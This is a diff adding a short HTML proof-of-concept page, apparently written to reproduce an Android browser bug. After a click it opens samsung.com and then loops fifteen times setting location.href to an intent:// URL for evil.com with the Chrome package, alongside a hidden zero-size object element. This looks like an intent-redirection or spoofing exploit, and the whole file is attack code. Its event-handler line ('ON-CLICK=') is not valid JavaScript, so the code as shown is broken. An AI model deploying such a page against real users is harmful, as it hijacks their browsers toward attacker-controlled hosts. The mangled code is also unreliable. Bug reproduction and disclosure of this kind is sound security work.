@@ -1,0 +1,18 @@
+<html>
+<object id="jnobgabnnbdhjompaagbfbjiimplamll" width="0" height="0" style="display: none;"></object><head></head><body>
+<center>
+<h1>Click anywhere to Reproduce</h1>
+</center>
+        <script>
+           ON-CLICK= () => {
+               window.open("https://www.samsung.com");
+               setTimeout(test,1);
+           }        
+
+           function test(){
+               for (let i = 0; i < 15; i++) {
+                location.href="intent://evil.com#Intent;scheme=http;package=com.android.chrome;end";
+               }
+           } 
+        </script>
+</body></html>
